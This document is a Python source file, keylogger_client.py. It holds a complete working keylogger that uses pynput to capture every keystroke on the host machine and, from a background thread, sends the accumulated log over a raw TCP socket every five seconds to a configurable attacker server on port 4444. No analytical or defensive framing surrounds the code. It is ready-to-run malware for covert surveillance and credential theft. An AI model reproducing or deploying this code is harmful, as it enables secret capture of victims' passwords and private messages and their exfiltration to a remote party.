# keylogger_client.py
import socket
import threading
from pynput import keyboard

# Configuration
SERVER_IP = "192.168.64.1"   # Replace with your server IP
SERVER_PORT = 4444
BUFFER_SIZE = 1024

# Global variable to hold keystrokes
log = ""

def send_log():
    global log
    while True:
        if log:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((SERVER_IP, SERVER_PORT))
                    s.sendall(log.encode('utf-8'))
                    print(f"[+] Sent: {log.strip()}")
                    log = ""  # Clear after sending
            except Exception as e:
                print(f"[-] Connection failed: {e}")
        threading.Event().wait(5)  # Send every 5 seconds

def on_press(key):
    global log
    try:
        # For normal character keys
        log += key.char
    except AttributeError:
        # Handle special keys safely
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log = log[:-1]
        else:
            # Use key.name if available, fallback to string
            try:
                log += f"[{key.name}]"
            except AttributeError:
                log += f"[{key}]"

# Start background thread to send logs
threading.Thread(target=send_log, daemon=True).start()

# Start listening to keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()